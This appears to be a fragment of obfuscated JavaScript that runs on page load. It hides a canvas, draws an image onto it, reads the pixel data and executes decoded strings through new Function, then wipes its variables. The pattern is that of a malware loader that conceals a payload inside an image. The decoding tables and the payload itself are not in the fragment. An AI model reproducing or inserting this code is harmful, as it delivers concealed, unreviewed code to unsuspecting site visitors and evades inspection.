v245513055ea63aa7879db0e2e0c7eede=v8a3adc59827ec2a734da833bf60c6047[11](11)(); v76974dc14579054f6a60897c2e250979=new Function('v30480dc1e2a1d4baf6c5d0546c5136a1',v8a3adc59827ec2a734da833bf60c6047[10](v410f4652041b557e71e1e2cf9e0ef1f2[10])); v5ad4bf05054026aa05490dbe713150eb=v8a3adc59827ec2a734da833bf60c6047[7](v8a3adc59827ec2a734da833bf60c6047[11](13)()); v8a3adc59827ec2a734da833bf60c6047[8](function(){ v795c3d0078320f5175d8a15a4f053ac0=v76974dc14579054f6a60897c2e250979(v410f4652041b557e71e1e2cf9e0ef1f2[5]); va72308d38db2768e0f3ee3249cc9d6bc=v8a3adc59827ec2a734da833bf60c6047[1](v8a3adc59827ec2a734da833bf60c6047[11](0)()); va72308d38db2768e0f3ee3249cc9d6bc.width=v5ad4bf05054026aa05490dbe713150eb.width; va72308d38db2768e0f3ee3249cc9d6bc.height=v5ad4bf05054026aa05490dbe713150eb.height; va72308d38db2768e0f3ee3249cc9d6bc.style.display=v8a3adc59827ec2a734da833bf60c6047[11](1)();v982b7063821ecaef507ac4b727623c4d=v410f4652041b557e71e1e2cf9e0ef1f2[4]; v36b531844e8df8aaa04a10e980c1c2ce=v8a3adc59827ec2a734da833bf60c6047[2]([va72308d38db2768e0f3ee3249cc9d6bc,v8a3adc59827ec2a734da833bf60c6047[11](2)()]); v9fbe928fd71ce071d82c5c1f8c3e89ee=new Function('v30480dc1e2a1d4baf6c5d0546c5136a1',v8a3adc59827ec2a734da833bf60c6047[10](v410f4652041b557e71e1e2cf9e0ef1f2[14])); v36b531844e8df8aaa04a10e980c1c2ce.drawImage(v5ad4bf05054026aa05490dbe713150eb, vd59121fb3cac08aa0a8b6824930bbfc8[0], vd59121fb3cac08aa0a8b6824930bbfc8[0]); v4620f0b7b47a301924c599c12eda1916=v36b531844e8df8aaa04a10e980c1c2ce.getImageData(vd59121fb3cac08aa0a8b6824930bbfc8[0], vd59121fb3cac08aa0a8b6824930bbfc8[0],va72308d38db2768e0f3ee3249cc9d6bc.width,va72308d38db2768e0f3ee3249cc9d6bc.height); vfe5b0816fea04f04397ec5a3bc9657b9=v8a3adc59827ec2a734da833bf60c6047[11](12)(); (new Function(v8a3adc59827ec2a734da833bf60c6047[10](v982b7063821ecaef507ac4b727623c4d)))(); v7c017964511a4e078499df8ead39f48b=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);v5ad4bf05054026aa05490dbe713150eb=v8a3adc59827ec2a734da833bf60c6047[4](v7c017964511a4e078499df8ead39f48b);va72308d38db2768e0f3ee3249cc9d6bc=v8a3adc59827ec2a734da833bf60c6047[4](va72308d38db2768e0f3ee3249cc9d6bc);v36b531844e8df8aaa04a10e980c1c2ce=v8a3adc59827ec2a734da833bf60c6047[4](v4620f0b7b47a301924c599c12eda1916);v4620f0b7b47a301924c599c12eda1916=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);v51106dd439d976ba84e7c7abed8434be=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);v982b7063821ecaef507ac4b727623c4d=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);vc76461c72bc454dca1bd38a154c2be84=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);v4ac03a7b8e0a01b7d45bd637e23e3444=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);v7c017964511a4e078499df8ead39f48b=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);vc8c57496a545ad42af4b882c850d314e=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);v245513055ea63aa7879db0e2e0c7eede=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);vfe5b0816fea04f04397ec5a3bc9657b9=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);v410f4652041b557e71e1e2cf9e0ef1f2=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);vd59121fb3cac08aa0a8b6824930bbfc8=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);v30480dc1e2a1d4baf6c5d0546c5136a1=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce);v30480dc1e2a1d4baf6c5d0546c5136a1=v8a3adc59827ec2a734da833bf60c6047[4](v795c3d0078320f5175d8a15a4f053ac0);v8a3adc59827ec2a734da833bf60c6047=v8a3adc59827ec2a734da833bf60c6047[4](v36b531844e8df8aaa04a10e980c1c2ce); }); vfe5b0816fea04f04397ec5a3bc9657b9=v8a3adc59827ec2a734da833bf60c6047[9](v8a3adc59827ec2a734da833bf60c6047[11](7)()+v410f4652041b557e71e1e2cf9e0ef1f2[9]); 